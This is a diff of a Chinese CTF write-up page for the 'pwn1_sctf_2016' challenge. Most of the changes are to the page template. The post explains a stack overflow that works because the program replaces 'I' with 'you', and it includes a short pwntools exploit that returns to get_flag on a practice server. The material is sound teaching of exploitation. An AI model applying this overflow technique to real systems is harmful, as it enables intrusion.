@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="CTF,Pwn">
-    <meta name="description" content="题目信息32位elf，开了NX  文件是C++的，需要安装下依赖 1sudo apt-get install lib32stdc++6  分析 存在vuln函数及get_flag函数   所以重点看vuln函数 fgets是读取输入，存在长度限制，但会把用户输入的I替换为you，这样三倍的长度就能够造成溢出：  offset可以测试出来是21*3+1，即64  exploit12345678910">
+    <meta name="description" content="题目信息32位elf，开了NX                                                                                                             文件是C++的，需要安装下依赖 1sudo apt-get install lib32stdc++6  分析">
 <meta property="og:type" content="article">
 <meta property="og:title" content="pwn1_sctf_2016">
 <meta property="og:url" content="https://darkwing.moe/2019/11/13/pwn1-sctf-2016/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="题目信息32位elf，开了NX  文件是C++的，需要安装下依赖 1sudo apt-get install lib32stdc++6  分析 存在vuln函数及get_flag函数   所以重点看vuln函数 fgets是读取输入，存在长度限制，但会把用户输入的I替换为you，这样三倍的长度就能够造成溢出：  offset可以测试出来是21*3+1，即64  exploit12345678910">
+<meta property="og:description" content="题目信息32位elf，开了NX                                                                                                             文件是C++的，需要安装下依赖 1sudo apt-get install lib32stdc++6  分析">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019111301.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019111302.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019111303.jpg">
@@ -125,7 +125,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -211,19 +211,61 @@
         </div>
         <div class="post-content" id="post-content" itemprop="postContent">
             <h1 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h1><p>32位elf，开了NX</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019111301.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019111301.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>文件是C++的，需要安装下依赖</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install lib32stdc++6</span><br></pre></td></tr></table></figure>
 
-<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019111302.jpg" alt=""></p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019111302.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>存在vuln函数及get_flag函数</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019111303.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019111304.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019111303.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019111304.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>所以重点看vuln函数</p>
 <p>fgets是读取输入，存在长度限制，但会把用户输入的I替换为you，这样三倍的长度就能够造成溢出：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019111305.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019111305.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>offset可以测试出来是21*3+1，即64</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019111306.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019111306.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process('./pwn1_sctf_2016')</span></span><br><span class="line">sh = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28495</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn1_sctf_2016'</span>)</span><br><span class="line"></span><br><span class="line">get_flag = elf.symbols[<span class="string">'get_flag'</span>]</span><br><span class="line">log.success(<span class="string">'get_flag_addr =&gt; &#123;&#125;'</span>.format(hex(get_flag)))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'I'</span> * <span class="number">21</span> + <span class="string">'A'</span> + p32(get_flag)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">print(sh.recv())</span><br></pre></td></tr></table></figure>
 
 
